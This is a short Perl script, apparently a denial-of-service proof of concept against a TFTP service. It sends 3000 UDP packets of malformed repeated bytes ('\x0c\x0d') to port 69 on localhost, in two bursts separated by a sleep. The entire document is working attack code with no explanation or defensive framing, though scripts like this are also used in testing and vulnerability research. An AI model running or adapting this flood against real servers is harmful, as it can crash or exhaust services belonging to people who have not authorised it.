#!/usr/bin/perl -w
 
use IO::Socket;
 
for (my $j = 0; $j < 2; $j++)
{
    sleep(2);
    for (my $i = 0; $i < 1500; $i++)
    {
        $st_socket = IO::Socket::INET->new(Proto=>'udp', 
PeerAddr=>'127.0.0.1', PeerPort=>69) or die "connect error";
     
        $p_c_buffer = "\x0c\x0d" x 10;
     
        print $st_socket $p_c_buffer;
     
        close($st_socket);
 
        print "sent " . $i . "\n";
    }
}
 
exit;
